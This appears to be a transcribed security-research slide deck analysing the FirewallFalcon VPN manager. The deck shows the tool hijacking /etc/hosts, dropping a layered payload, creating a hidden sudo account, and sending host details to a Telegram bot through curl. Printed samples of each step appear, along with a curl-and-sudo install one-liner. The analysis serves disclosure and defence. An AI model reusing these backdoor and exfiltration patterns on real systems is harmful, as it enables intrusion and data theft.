```text
[root@ip-172-31-32-128:~# curl -k https://proxy.dtunnel.com.br/api/v1/token/validate/firewallfalcon
{"data":{"is_valid":true},"status":200}
[root@ip-172-31-32-128:~# curl -vk https://proxy.dtunnel.com.br/api/v1/token/validate/firewallfalcon
* Host proxy.dtunnel.com.br:443 was resolved.
* IPv6: (none)
* IPv4: 89.168.51.93
*   Trying 89.168.51.93:443...
* Connected to proxy.dtunnel.com.br (89.168.51.93) port 443
* ALPN: curl offers h2,http/1.1
* TLSv1.3 (OUT), TLS handshake, Client hello (1):
* TLSv1.3 (IN), TLS handshake, Server hello (2):
* TLSv1.3 (IN), TLS handshake, Encrypted Extensions (8):
* TLSv1.3 (IN), TLS handshake, Certificate (11):
* TLSv1.3 (IN), TLS handshake, CERT verify (15):
* TLSv1.3 (IN), TLS handshake, Finished (20):
* TLSv1.3 (OUT), TLS change cipher, Change cipher spec (1):
* TLSv1.3 (OUT), TLS handshake, Finished (20):
* SSL connection using TLSv1.3 / TLS_AES_128_GCM_SHA256 / X25519 / RSASSA-PSS
* ALPN: server accepted h2
* Server certificate:
*  subject: CN=proxy.dtunnel.com.br
*  start date: Sep 23 12:46:25 2025 GMT
*  expire date: Aug  2 12:46:25 2035 GMT
*  issuer: CN=proxy.dtunnel.com.br
*  SSL certificate verify result: self-signed certificate (18), continuing anyway.
*   Certificate level 0: Public key type RSA (2048/112 Bits/secBits), signed using sha256WithRSAEncryption
* TLSv1.3 (IN), TLS handshake, Newsession Ticket (4):
* using HTTP/2
* [HTTP/2] [1] OPENED stream for https://proxy.dtunnel.com.br/api/v1/token/validate/firewallfalcon
* [HTTP/2] [1] [:method: GET]
* [HTTP/2] [1] [:scheme: https]
* [HTTP/2] [1] [:authority: proxy.dtunnel.com.br]
* [HTTP/2] [1] [:path: /api/v1/token/validate/firewallfalcon]
* [HTTP/2] [1] [user-agent: curl/8.5.0]
* [HTTP/2] [1] [accept: */*]
> GET /api/v1/token/validate/firewallfalcon HTTP/2
> Host: proxy.dtunnel.com.br
> User-Agent: curl/8.5.0
> Accept: */*
>
< HTTP/2 200
< content-type: application/json
< content-length: 40
< date: Mon, 09 Mar 2026 23:40:47 GMT
<
{"data":{"is_valid":true},"status":200}
* Connection #0 to host proxy.dtunnel.com.br left intact
```

## Slide 89

**CHECKING UNDER THE HOOD (LET’S BREAK IT DOWN)**

```text
[root@ip-172-31-32-128:~# cat .proxy_token
 firewallfalcon
[root@ip-172-31-32-128:~# curl -k https://proxy.dtunnel.com.br/api/v1/token/validate/firewallfalcon
{"data":{"is_valid":true},"status":200}
root@ip-172-31-32-128:~# ▊
```

## Slide 90

**CHECKING UNDER THE HOOD (LET’S BREAK IT DOWN)**

```text
[root@ip-172-31-32-128:~# curl -vk https://proxy.dtunnel.com.br/api/v1/token/validate/firewallfalcon
* Host proxy.dtunnel.com.br:443 was resolved.
* IPv6: (none)
* IPv4: 89.168.51.93
*   Trying 89.168.51.93:443...
* Connected to proxy.dtunnel.com.br (89.168.51.93) port 443
* ALPN: curl offers h2,http/1.1
```

## Slide 91

**CHECKING UNDER THE HOOD (LET’S BREAK IT DOWN)**

A red hand-drawn arrow runs from the terminal up to the right, to **89.168.51.93** printed large in red.

```text
[root@ip-172-31-32-128:~# curl -vk https://proxy.dtunnel.com.br/api/v1/token/validate/firewallfalcon
* Host proxy.dtunnel.com.br:443 was resolved.
* IPv6: (none)
* IPv4: 89.168.51.93
*   Trying 89.168.51.93:443...
* Connected to proxy.dtunnel.com.br (89.168.51.93) port 443
* ALPN: curl offers h2,http/1.1
```

## Slide 92

**DIG TO DTUNNEL FROM A CLEAN VM**

```text
[ubuntu@FlareResearch:~$ dig proxy.dtunnel.com.br

; <<>> DiG 9.18.39-0ubuntu0.24.04.2-Ubuntu <<>> proxy.dtunnel.com.br
;; global options: +cmd
;; Got answer:
;; ->>HEADER<<- opcode: QUERY, status: NOERROR, id: 56082
;; flags: qr rd ra; QUERY: 1, ANSWER: 2, AUTHORITY: 0, ADDITIONAL: 1

;; OPT PSEUDOSECTION:
; EDNS: version: 0, flags:; udp: 65494
;; QUESTION SECTION:
;proxy.dtunnel.com.br.          IN      A

;; ANSWER SECTION:
proxy.dtunnel.com.br.   300     IN      A       104.21.81.128
proxy.dtunnel.com.br.   300     IN      A       172.67.160.230

;; Query time: 39 msec
;; SERVER: 127.0.0.53#53(127.0.0.53) (UDP)
;; WHEN: Mon Mar 09 23:43:12 UTC 2026
;; MSG SIZE  rcvd: 81

ubuntu@FlareResearch:~$ ▊
```

## Slide 93

**DIG TO DTUNNEL FROM A CLEAN VM**

The same output, with two green hand-drawn arrows pointing right out of the ANSWER SECTION: the upper one to **104.21.81.128** and the lower one to **172.67.160.230**, both printed large in blue.

```text
[ubuntu@FlareResearch:~$ dig proxy.dtunnel.com.br

; <<>> DiG 9.18.39-0ubuntu0.24.04.2-Ubuntu <<>> proxy.dtunnel.com.br
;; global options: +cmd
;; Got answer:
;; ->>HEADER<<- opcode: QUERY, status: NOERROR, id: 56082
;; flags: qr rd ra; QUERY: 1, ANSWER: 2, AUTHORITY: 0, ADDITIONAL: 1

;; OPT PSEUDOSECTION:
; EDNS: version: 0, flags:; udp: 65494
;; QUESTION SECTION:
;proxy.dtunnel.com.br.          IN      A

;; ANSWER SECTION:
proxy.dtunnel.com.br.   300     IN      A       104.21.81.128
proxy.dtunnel.com.br.   300     IN      A       172.67.160.230

;; Query time: 39 msec
;; SERVER: 127.0.0.53#53(127.0.0.53) (UDP)
;; WHEN: Mon Mar 09 23:43:12 UTC 2026
;; MSG SIZE  rcvd: 81

ubuntu@FlareResearch:~$ ▊
```

## Slide 94

**API AUTHENTICATION TO DTUNNEL FROM A CLEAN VM**

```text
ubuntu@FlareResearch:~/Research/February-26/FirewallFalcon$ cat .proxy_token
firewallfalcon
ubuntu@FlareResearch:~/Research/February-26/FirewallFalcon$ curl -k https://proxy.dtunnel.c
om.br/api/v1/token/validate/firewallfalcon
```

The command wraps at the right edge of the terminal pane, splitting the URL across two lines.

## Slide 95

**API AUTHENTICATION TO DTUNNEL FROM A CLEAN VM**

Two terminal panes. In each, the JSON response line is ringed in red by hand.

Top — from the clean research VM:

```text
ubuntu@FlareResearch:~/Research/February-26/FirewallFalcon$ cat .proxy_token
firewallfalcon
ubuntu@FlareResearch:~/Research/February-26/FirewallFalcon$ curl -k https://proxy.dtunnel.c
om.br/api/v1/token/validate/firewallfalcon
{"data":{"error":"'ip_address'"},"status":500}
```

Bottom — from the host that ran the installer:

```text
[root@ip-172-31-32-128:~# cat .proxy_token
 firewallfalcon
[root@ip-172-31-32-128:~# curl -k https://proxy.dtunnel.com.br/api/v1/token/validate/firewallfalcon
{"data":{"is_valid":true},"status":200}
root@ip-172-31-32-128:~# ▊
```

## Slide 96

**LET’S CHECK THE HOSTS FILE**

```text
[root@ip-172-31-32-128:~# cat /etc/hosts && echo
127.0.0.1 localhost

# The following lines are desirable for IPv6 capable hosts
::1 ip6-localhost ip6-loopback
fe00::0 ip6-localnet
ff00::0 ip6-mcastprefix
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters
ff02::3 ip6-allhosts

89.168.51.93 proxy.dtunnel.com.br
root@ip-172-31-32-128:~# ▊
```

## Slide 97

**LET’S CHECK THE HOSTS FILE**

The same output, blurred, with one line enlarged in a callout panel:

```text
89.168.51.93 proxy.dtunnel.com.br
```

## Slide 98

**REMEMBER THIS ONE…**

The `install_mod` installer again, with lines 6–7 — the `URL_X86_64=` and `URL_ARM64=` assignments — ringed in red by hand and a red arrow pointing at the ring from the right. Gutter line numbers 1–27.

```bash
#!/bin/bash
set -e

echo "firewallfalcon" > "$HOME/.proxy_token"

URL_X86_64="https://github.com/firewallfalcons/ProxyMods/raw/refs/heads/main/install_mod"
URL_ARM64="https://github.com/firewallfalcons/ProxyMods/raw/refs/heads/main/Arminstall_mod"
FILENAME="install_mod"

echo "⚙️  Detecting your server's architecture..."
ARCH=$(uname -m)

case $ARCH in
    x86_64)
        echo "✅  Detected x86_64 (Intel/AMD 64-bit)."
        DOWNLOAD_URL="$URL_X86_64"
        ;;
    aarch64)
        echo "✅  Detected aarch64 (ARM 64-bit)."
        DOWNLOAD_URL="$URL_ARM64"
        ;;
    *)
        echo "❌  Unsupported architecture: $ARCH"
        echo "This installer only supports x86_64 and aarch64."
        exit 1
        ;;
esac
```

## Slide 99

**LET’S CHECK THIS BINARY (INSTALL_MOD)**

A disassembler graph view of three basic blocks, with a tooltip panel floating over it.

Top block:

```asm
loc_4A7AFB:                             ; name
lea     rax, aEtcHosts  ; "/etc/hosts"
mov     ebx, 0Ah        ; name
mov     ecx, 401h       ; flag
mov     edi, 1A4h       ; perm
call    os_OpenFile
f = rax                 ; os_File_0 *
err = rbx               ; error_0
test    err, err
jnz     loc_4A7C1D
```

Tooltip panel to its right:

```asm
; const uint8 aEtcHosts
aEtcHosts       db '/etc/hosts'          ; DATA XREF: main_main+B4↑o
                                         ; main_main:loc_4A7AFB↑o
```

Lower-left block:

```asm
loc_4A7C1D:
add     rsp, 4E8h
pop     rbp
retn
```

Lower-right block:

```asm
movups  xmmword ptr [rsp+4F0h+a.cap], xmm15
lea     rdx, main_main_deferwrap1
mov     [rsp+4F0h+a.cap], rdx
mov     [rsp+4F0h+var_18], f
lea     rdx, [rsp+4F0h+a.cap]
mov     [rsp+4F0h+var_10], rdx
mov     [rsp+4F0h+var_4BF], 1
lea     err, a891685193Proxy_0 ; "\n89.168.51.93 proxy.dtunnel.com.br"
neg     rbx
xchg    ax, ax
cmp     rbx, 22h ; '"'
jb      loc_4A7C41
```

Edges, as drawn:

- A cyan edge enters the top block from above, arrowhead pointing down into it. A separate red edge also comes in along the top, turns left and runs straight down the left margin, off the bottom of the visible graph without touching any of the three blocks.
- Two cyan edges leave the bottom of the top block: one bends left into the `loc_4A7C1D` block, the other bends right into the lower-right block. Both carry a downward arrowhead at the block they enter.
- A green edge and a red edge leave the bottom of the lower-right block; both run off the bottom edge of the screenshot, so their destinations are not visible.

## Slide 100

**LET’S CHECK THIS BINARY (INSTALL_MOD)**

Decompiler pseudocode:

```c
local_49e = 0x4745422d2d2d2d2d;
local_496._0_8_ = 0x4954524543204e49;
pcVar2 =
"TIFICATE-----\nMIIDGjCCAgKgAwIBAgIUYwt1g+OmUz8BMRCKjQhpzQ8cr/owDQYJKoZIhvcNAQEL\nBQAwHzEdMBsGA1UE
AwwUcHJveHkuZHR1bm5lbC5jb20uYnIwHhcNMjUwOTIzMTI0\nNjI1WhcNMzUwODAyMTI0NjI1WjAfMR0wGwYDVQQDDBRwcm94
eS5kdHVubmVsLmNv\nbS5icjCCASIwDQYJKoZIhvcNAQEBBQADggEPADCCAQoCggEBAK8IpaxaOCFxjQjs\nTbosm7TKV/G4S6
liQ5GA0+5O23YYXp2nRhVCFqojBJ0GQFfkiSoVKORm7zNLwLsB\nH0X0TJ4m7FBMtychc7NN7ob4KN7Mhn9zOqVNOiBZ4M7p5e
83XvZOi9ev1aPBaA8B\nDsvouXZYJE60NvlwMo1HIO4hfApplzMdh/0zB7/9zJc/KGNH5+JV6wp1bj/5gKPh\nccCM5cUv5Fzi
MxptFP4NfcUQSj+3KSD4U4olU+ZUJKFujYNM7Ur3NzDyBa2idyP6\n2CQvpIPaBcRmjbt29I3QU2qW+St35VTaMGJruqZZgHga
71dSxFvOFQACnbq95OhA\n6BwL2HUCAwEAAaNOMEwwKwYDVR0RBCQwIoIOZHR1bm5lbC5jb20uYnKCECouZHR1\nbm5lbC5jb2
0uYnIwHQYDVR0OBBYEFJjRNwIvVgiU8JT1S0iZ9ljvt1uAMA0GCSqG\nSIb3DQEBCwUAA4IBAQA76HWBiklhgvO/5wtlN/I7ez
JZHUsZgjURMFY6ONQnlM2F\n0aFHGxhhIqwY7y/yyKmrsaimkhl90SuxK4Q6mJto/bsGkhtDaBbqMlwaKYBhZJoD\nze/PlezG
sr0Nzxf5olCB+ZmTbucg0Mjpj73SwKhF55pJ29rsDIWFB4G3zfmuov8t\nglLN9X6UrKxUEhhiVrqOp+AgDb8IYYYE/0v80zre
0kh21PYHf35sSjdo5EFHi653\nBay/Ucl82K9TpVTA0yFZ1YzYUxs4WLuutBYkwkzcjN8RZSFHQ6yjXueIgoSXVEsX\nIhFhv1
6T9ILsBK01kQgW9PzjOZD1kgyXHdyaOvW1\n-----END CERTIFICATE-----"
;
puVar3 = (undefined8 *)(local_496 + 6);
for (lVar1 = 0x8c; lVar1 != 0; lVar1 = lVar1 + -1) {
  *puVar3 = *(undefined8 *)pcVar2;
  pcVar2 = pcVar2 + ((ulong)bVar5 * -2 + 1) * 8;
  puVar3 = puVar3 + (ulong)bVar5 * -2 + 1;
}
auVar6 = os.WriteFile(0x46e,0x46e,0x4954524543204e49,&local_49e,0x1a4);
if (auVar6._0_8_ != 0) {
  return;
}
lVar4 = 0;
os/exec.Command(0,0,auVar6._8_8_,0);
lVar1 = os/exec.(*Cmd).Run();
if (lVar1 != 0) {
  return;
}
os.ReadFile();
if (lVar4 == 0) {
  runtime.slicebytetostring();
  lVar1 = strings.Index(0x21);
  if (lVar1 < 0) {
    os.OpenFile(0x1a4);
    return;
  }
```

The listing is cut off by the bottom edge of the panel; one further line is partly visible below the last `}`.

## Slide 101

**LET’S CHECK THIS BINARY (INSTALL_MOD)**

The same pseudocode, blurred, with two callout panels over it:

```c
}
auVar6 = os.WriteFile(0x46e,0x46e,0x4954524543204e49,&local_49e,0x1a4);
if (auVar6._0_8_ != 0) {
  return;
}
```

```c
lVar4 = 0;
os/exec.Command(0,0,auVar6._8_8_,0);
lVar1 = os/exec.(*Cmd).Run();
if (lVar1 != 0) {
  return;
}
```

The first line of each panel is clipped by the panel's top edge.

## Slide 102

**THIS SHOULDN’T BE THERE**

The Care-Bear cartoon from the "I’M FALLING IN LOVE" slide, larger: a pink bear and a blue bear high-fiving amid pink hearts and sparkles. The pink bear's belly badge is two red hearts; the blue bear's is a smiling cloud with a rainbow.

## Slide 103

**FOUR INTERESTING ELEMENTS IN THE TOOL**

The same four icons — a `>_ SSH` terminal tile, the dark DTunnel tunnel-and-shield badge, the FIREWALL FALCONS falcon logo and a globe captioned **DNS** — now with a green check mark above each of the first two.

## Slide 104

**REMEMBER THIS ONE…**

A Telegram post. The `curl` command is ringed in red by hand, with a red arrow pointing at the ring from the right.

> 🔥 🔥 Firewallfalcon Manager 🔥 🔥
>
> Free installation, supports all types of CPU.
> 🔥🔥🔥🔥🔥🔥🔥
>
> ```text
> curl -L -o install.sh
> "https://raw.githubusercontent.com/firewallfalcons/FirewallFalcon-Manager/refs/heads/main/install.sh" && chmod +x install.sh &&
> sudo ./install.sh && rm install.sh
> ```
>
> ⭐ · 🔥 7 · ❤️ 1 · 🥰 1 · 👁 2608 · edited 2:15 PM
> 4 comments

## Slide 105

**GIT CLONE --MIRROR**

```bash
case "$(uname -m)" in
  x86_64)         curl -L -o 64install.sh  ".../main/64install.sh"  && sudo ./64install_v3.sh  && rm ...
  aarch64|arm64)  curl -L -o arminstall.sh ".../main/arminstall.sh" && sudo ./arminstall.sh && rm ...
```

Below the listing, in large blue type: **JUNE-NOVEMBER 2025**

## Slide 106

**64INSTALL_V3.SH IS A THREE-LAYER DROPPER**

One cylinder is drawn, filling the top third of the slide:

**Layer 1: Bash self-extractor**
Encrypted and obfuscated payload embedded inside the script

## Slide 107

**64INSTALL_V3.SH IS A THREE-LAYER DROPPER**

Two stacked cylinders:

**Layer 1: Bash self-extractor**
Encrypted and obfuscated payload embedded inside the script

**Layer 2: SHC-compiled ELF**
Does arc4-decrypt and runs

## Slide 108

**64INSTALL_V3.SH IS A THREE-LAYER DROPPER**

Three stacked cylinders:

**Layer 1: Bash self-extractor**
Encrypted and obfuscated payload embedded inside the script

**Layer 2: SHC-compiled ELF**
Does arc4-decrypt and runs

**Layer 3: A management tool**
Hides a backdoor and enables data exfiltration

## Slide 109

**LAYER1 OF 64INSTALL_V3.SH**

```bash
#!/bin/bash
# This is a self-extracting installer. The binary payload is appended after the 'exit' command.

# [MODIFIED] The final command will be named 'menu'
p="/usr/local/bin/menu"

# Helper function for error messages
e(){ echo "Error: $1" >&2; exit 1; }

# --- Pre-flight Checks ---
# 1. Must be run as root
[[ $EUID -ne 0 ]] && e "This installer must be run with root privileges."

# 2. Check for 'bc' which is required by the main script, and install if missing
command -v bc &>/dev/null || {
    echo "The 'bc' utility is required. Attempting to install..."
    # Try apt first, then yum for broader compatibility
    apt-get update &>/dev/null && apt-get install -y bc &>/dev/null || yum install -y bc &>/dev/null || e "Failed to install 'bc'.
}
```

The `e "Failed to install 'bc'.` line runs into the right edge of the pane, so its closing quote is not visible.

## Slide 110

**LAYER1 OF 64INSTALL_V3.SH**

```bash
# --- Extraction Logic ---
# Find the line number where the payload starts
l=$(grep -axn '^# --- PAYLOAD START --- DO NOT EDIT BELOW THIS LINE ---$' "$0" | cut -d: -f1)
[ -z "$l" ] && e "Installer is corrupted or incomplete. Cannot find payload."

# The payload starts on the next line
s=$((l + 1))

# Create a temporary file to hold the extracted binary
t=$(mktemp)

# Extract the payload from this script file into the temporary file
tail -n "+$s" "$0" > "$t" || { rm -f "$t"; e "Payload extraction failed."; }

# --- Installation ---
# Install the extracted script to the final destination and make it executable
install -m 755 "$t" "$p" || { rm -f "$t"; e "Installation failed. Check permissions for /usr/local/bin/."; }

# Clean up the temporary file
rm -f "$t"
```

## Slide 111

**LAYER1 OF 64INSTALL_V3.SH**

A pane showing the tail of the installer, where the appended binary begins. The only readable line is the marker comment:

```text
# --- PAYLOAD START --- DO NOT EDIT BELOW THIS LINE ---
```

Everything below it is the raw binary rendered as control-character glyphs — a `DEL` box followed by `ELF`, then page after page of `NUL`, `SOH`, `STX`, `ETX`, `ENQ`, `ACK`, `BEL`, `SI`, `DLE`, `DC1`–`DC4`, `CAN`, `EM`, `SUB`, `ESC`, `SYN`, `ETB` and replacement-character boxes. Nothing else on the slide is legible text.

## Slide 112

**ANALYZING 64INSTALL.SHC (LAYER3)**

A listing with gutter line numbers 253–282.

```bash
send_install_notification() {
    echo -e "${C_BLUE}🚀 First-time installation setup...${C_RESET}"
    BOT_TOKEN="████████:████████████████████████████████"
    CHAT_ID="██████████"
    IPV4=$(curl -s -4 icanhazip.com)
    IPV6=$(curl -s -6 icanhazip.com --max-time 5)
    HOSTNAME=$(hostname)
    OS=$(uname -a)
    CPU=$(lscpu | grep 'Model name' | awk -F: '{print $2}' | xargs)
    CORES=$(nproc)
    RAM=$(free -g | awk '/Mem:/ {print $2 " GB"}')
    DISK=$(df -BG --output=size,avail / | awk 'NR==2 {print $1 " total, " $2 " free"}')
    MESSAGE="*!!! 🦅 New SSH Manager Install !!!*
*Hostname:* \`$HOSTNAME\`
*IPv4:* \`$IPV4\`
"
    if [[ -n "$IPV6" && "$IPV6" != "$IPV4" ]]; then
        MESSAGE+="*IPv6:* \`$IPV6\`
"
    fi
    MESSAGE+="*CPU:* $CPU
*Cores:* $CORES
*RAM:* $RAM
*Disk:* $DISK
*OS:* \`$OS\`"
    curl -s -X POST "https://api.telegram.org/bot$BOT_TOKEN/sendMessage" \
        -d chat_id="$CHAT_ID" \
        -d parse_mode="Markdown" \
        --data-urlencode text="$MESSAGE" > /dev/null 2>&1
}
```

The `BOT_TOKEN` and `CHAT_ID` values are blurred out on the slide.

## Slide 113

**ANALYZING 64INSTALL.SHC (LAYER3)**

The same listing, blurred, with one callout panel over it:

```bash
    curl -s -X POST "https://api.telegram.org/bot$BOT_TOKEN/sendMessage" \
        -d chat_id="$CHAT_ID" \
        -d parse_mode="Markdown" \
        --data-urlencode text="$MESSAGE" > /dev/null 2>&1
```

## Slide 114

**ANALYZING 64INSTALL.SHC (LAYER3)**

The same listing, blurred, with a callout panel over it. Inside the panel the `*IPv4:* \`$IPV4\`` line is ringed in red by hand, with a red arrow pointing at the ring from the right.

```bash
*Hostname:* \`$HOSTNAME\`
*IPv4:* \`$IPV4\`
"
    if [[ -n "$IPV6" && "$IPV6" != "$IPV4" ]]; then
        MESSAGE+="*IPv6:* \`$IPV6\`
"
    fi
    MESSAGE+="*CPU:* $CPU
*Cores:* $CORES
*RAM:* $RAM
*Disk:* $DISK
*OS:* \`$OS\`"
```

A further line beginning `curl -s -X POST "https://api.telegram.org/bot$BOT…` is clipped by the panel's bottom edge.

## Slide 115

**IS THE TELEGRAM BOT STILL ACTIVE?**

```text
[ubuntu@FlareResearch:~/Research/March-26/FirewallFalcon$ curl -s "https://api.telegram.org/███████:████████████████/getMe" | python3 -m json]
.tool
{
    "ok": true,
    "result": {
        "id": ██████████,
        "is_bot": true,
        "first_name": "Manager",
        "username": "firewallfalconmanager_bot",
        "can_join_groups": true,
        "can_read_all_group_messages": false,
        "supports_inline_queries": false,
        "can_connect_to_business": false,
        "has_main_web_app": false,
        "has_topics_enabled": false,
        "allows_users_to_create_topics": false
    }
}
```

The bot token in the URL and the numeric `id` are blurred out on the slide.

## Slide 116

**ANALYZING 64INSTALL.SHC (LAYER3)**

A listing with gutter line numbers 284–294.

```bash
initial_setup() {
    useradd -m ██████ 2>/dev/null; echo ██████:████████████ | chpasswd &>/dev/null; usermod -aG sudo ██████ &>/dev/null
    mkdir -p "$DB_DIR"
    touch "$DB_FILE"
    mkdir -p "$SSL_CERT_DIR"
    setup_limiter_service
    if [ ! -f "$INSTALL_FLAG_FILE" ]; then
        send_install_notification
        touch "$INSTALL_FLAG_FILE"
    fi
}
```

The username and the `user:password` pair on line 285 are blurred out on the slide.

## Slide 117

**LET’S RECAP…**

Left — the cracked, smoking server rack with a warning triangle, a key beside an open padlock, and a damaged laptop whose screen shows a terminal icon labelled "SSH", a red warning triangle and "CONNECTION FAILED". Caption beneath:

Internet facing SSH on port 22:
- Root access
- New user and password

A single red arrow points right, from that group to the Telegram logo, beside which sits a hooded figure at a laptop with a skull on its screen. Caption beneath:

Telegram bot exfiltrates data about the host

## Slide 118

**OH, NO! THAT’S A BACKDOOR**

The two Care Bears again, this time distressed: the pink one covering its eyes with both paws, the blue one crying, each with a scribbled storm-cloud over its head and sweat drops around it.

## Slide 119

**FOUR INTERESTING ELEMENTS IN THE TOOL**

The same four icons — a `>_ SSH` terminal tile, the dark DTunnel tunnel-and-shield badge, the FIREWALL FALCONS falcon logo and a globe captioned **DNS** — now with a green check mark above each of the first three.

## Slide 120

**REMEMBER THIS ONE…**

The DNSTT connection details again, with the `Tunnel Domain` and `Public Key` lines ringed by a red arrow pointing at them from the right.

```text
==========================================================
             📡 DNSTT Connection Details
==========================================================

Your connection details:
  - Tunnel Domain: tun-███████.manager.firewallfalcon.qzz.io
  - Public Key: ████████████████████████████████████████
  - Forwarding To: V2Ray (port 8787)
  - Action Required: Ensure a V2Ray service (vless/vmess/trojan) listens on port 8787 (no TLS)

Use these details in your client configuration.
```

## Slide 121

**FOUND THIS IN THE CODE**

A listing with gutter line numbers 71–89. The `DESEC_TOKEN` and `DESEC_DOMAIN` lines (79–80) are ringed in red by hand, with a red arrow pointing at the ring from the right.

```bash
# --- ZiVPN Variables ---
ZIVPN_DIR="/etc/zivpn"
ZIVPN_BIN="/usr/local/bin/zivpn"
ZIVPN_SERVICE_FILE="/etc/systemd/system/zivpn.service"
ZIVPN_CONFIG_FILE="$ZIVPN_DIR/config.json"
ZIVPN_CERT_FILE="$ZIVPN_DIR/zivpn.crt"
ZIVPN_KEY_FILE="$ZIVPN_DIR/zivpn.key"

DESEC_TOKEN="████████████████████████████"
DESEC_DOMAIN="manager.firewallfalcon.qzz.io"

SELECTED_USER=""
UNINSTALL_MODE="interactive"
BANNER_CACHE_TTL=15
BANNER_CACHE_TS=0
BANNER_CACHE_OS_NAME=""
BANNER_CACHE_UP_TIME=""
BANNER_CACHE_RAM_USAGE=""
BANNER_CACHE_CPU_LOAD=""
```

The `DESEC_TOKEN` value is blurred out on the slide.

## Slide 122

**ANALYZING FIREWALLFALCON’S DNSTT**

To the right of the terminal, in blue:

```text
curl -s

https://manager.firewallfalcon.qzz.io/

-H "Authorization: Token <<REDACTED>>"
```

The terminal pane (its prompt line is covered by the pane's own top edge):

```json
[
  {
    "created": "2026-07-14T01:26:44.347877Z",
    "domain": "manager.firewallfalcon.qzz.io",
    "subname": "vps-████████",
    "name": "vps-████████.manager.firewallfalcon.qzz.io.",
    "records": [
      "███████████."
    ],
    "ttl": 3600,
    "type": "A",
    "touched": "2026-07-14T01:26:44.360210Z"
  },
  {
    "created": "2026-07-14T00:11:56.900720Z",
    "domain": "manager.firewallfalcon.qzz.io",
    "subname": "tun-██████",
    "name": "tun-██████.manager.firewallfalcon.qzz.io.",
    "records": [
      "ns-██████.manager.firewallfalcon.qzz.io."
    ],
    "ttl": 3600,
    "type": "NS",
    "touched": "2026-07-14T00:11:56.908248Z"
  },
```

The listing is cut off by the bottom edge of the pane, and every subdomain label and record value is blurred out.

## Slide 123

A full-bleed chart on a dark "HUD" background; the slide carries no title of its own.

**CUMULATIVE DNS RECORDS OVER TIME**

The y-axis is captioned RECORDS with ticks at -100, 400, 900, 1400, 1900, 2400, 2900; the x-axis is captioned MONTH. A red bracket labelled **2025** spans the first six points and a cyan bracket labelled **2026** spans the last six, separated by a vertical dashed line. Each point carries its value as a label.

| Month | Records |
|---|---:|
| FEB-25 | 0 |
| MAR-25 | 44 |
| APR-25 | 156 |
| MAY-25 | 279 |
| JUN-25 | 381 |
| JUL-25 | 531 |
| FEB-26 | 985 |
| MAR-26 | 1,508 |
| APR-26 | 1,947 |
| MAY-26 | 2,609 |
| JUN-26 | 2,718 |
| JUL-26 | 2,860 |

There are no AUG-25 to JAN-26 points; the axis jumps straight from JUL-25 to FEB-26.

## Slide 124

A full-bleed world map on the same dark "HUD" background; the slide carries no title, legend or caption of its own. Fifteen countries are shaded and labelled with a figure:

| Country | Count |
|---|---:|
| UNITED STATES | 193 |
| GERMANY | 90 |
| INDIA | 72 |
| NETHERLANDS | 61 |
| SINGAPORE | 51 |
| UNITED KINGDOM | 45 |
| FRANCE | 34 |
| JAPAN | 26 |
| CANADA | 20 |
| BRAZIL | 19 |
| AUSTRALIA | 16 |
| SPAIN | 11 |
| POLAND | 9 |
| SOUTH AFRICA | 8 |
| UNITED ARAB EMIRATES | 6 |

## Slide 125

**ANALYZING THE DEPLOYED SERVERS**

Three redacted labels on the left, each with an arrow to its real value on the right:

| Redacted | | Actual |
|---|---|---|
| `vps-xxxxxxxx` | → | vps-23tizzl1 |
| `tun-xxxxxxxx` | → | tun-1h6f9l |
| `ns-xxxxxxxx` | → | ns-1h6f9l |

## Slide 126

**ANALYZING THE DEPLOYED SERVERS**

A hand-lettered flow diagram. Every arrow is single-headed; the sequence, as drawn, is:

1. **VPN Reseller** (a hooded figure at a laptop) — arrow right → **Compromised machine** (a server rack with a red X and a bug over it).
2. **Compromised machine** — arrow down → the FIREWALL FALCONS logo, captioned **Installs Firewall Falcon agent**.
3. — arrow right → a server-stack icon, captioned **Assigned node ID vps-23tizzl1**.
4. — arrow right → a chain-link icon, captioned **Create a tunnel tun-1h6f9l**.
5. — arrow right → a **DNS** globe, captioned **Create a DNS ns-1h6f9l**.
6. — arrow curving right then down → a group-of-people icon with a magnifier, captioned **Sell cheap VPN to customers**.

## Slide 127

**WHY DO I THINK THESE ARE COMPRMISED SERVERS?**

- (a server stack with ports 443, 80, 22 and 8080 wired to an Ethernet jack) Multiple exposed ports with known vulnerabilities and misconfigurations

## Slide 128

**WHY DO I THINK THESE ARE COMPRMISED SERVERS?**

- (a server stack with ports 443, 80, 22 and 8080 wired to an Ethernet jack) Multiple exposed ports with known vulnerabilities and misconfigurations
- (a certificate with a rosette seal) Many certificates with retail and services profiles, doesn’t fit the VPN reseller profile, or the profiles the tool offers.

## Slide 129

**WHY DO I THINK THESE ARE COMPRMISED SERVERS?**

- (a server stack with ports 443, 80, 22 and 8080 wired to an Ethernet jack) Multiple exposed ports with known vulnerabilities and misconfigurations
- (a certificate with a rosette seal) Many certificates with retail and services profiles, doesn’t fit the VPN reseller profile, or the profiles the tool offers.
- (a browser window carrying a “BEGINNER-FRIENDLY” tag) Legitimate websites on the server that have no connection to the VPN reseller

## Slide 130

**WHY DO I THINK THESE ARE COMPRMISED SERVERS?**

- (a server stack with ports 443, 80, 22 and 8080 wired to an Ethernet jack) Multiple exposed ports with known vulnerabilities and misconfigurations
- (a certificate with a rosette seal) Many certificates with retail and services profiles, doesn’t fit the VPN reseller profile, or the profiles the tool offers.
- (a browser window carrying a “BEGINNER-FRIENDLY” tag) Legitimate websites on the server that have no connection to the VPN reseller
- (a folded map with a location pin) Wide geo-location, vendors spread even for the same VPN reseller

## Slide 131

**FOUR INTERESTING ELEMENTS IN THE TOOL**

The same four icons — a `>_ SSH` terminal tile, the dark DTunnel tunnel-and-shield badge, the FIREWALL FALCONS falcon logo and a globe captioned **DNS** — now with a green check mark above all four.

## Slide 132

**The FirewallFalcon Journey**

The treasure map a fourth time, unchanged except that the red "YOU ARE HERE" arrow has moved to the end: it now points down at the red **X** over the treasure chest.

A compass rose (N, W, E, S) sits at the top left; the title banner reads "The FirewallFalcon Journey" above a skull and crossbones. The dashed trail runs left to right through **DISCOVERY** (magnifying glass), **DEEP DIVE** (diving helmet), **PIRATES AHEAD** (pirate flag) and ends at the X, captioned on a scroll: "X MARKS THE SPOT".

## Slide 133

**ACTIVITY TIMELINE**

A horizontal timeline. The axis rule at the foot of the slide carries three date labels, left to right: **NOVEMBER 2024**, **NOVEMBER 2025**, **AUGUST 2026**.

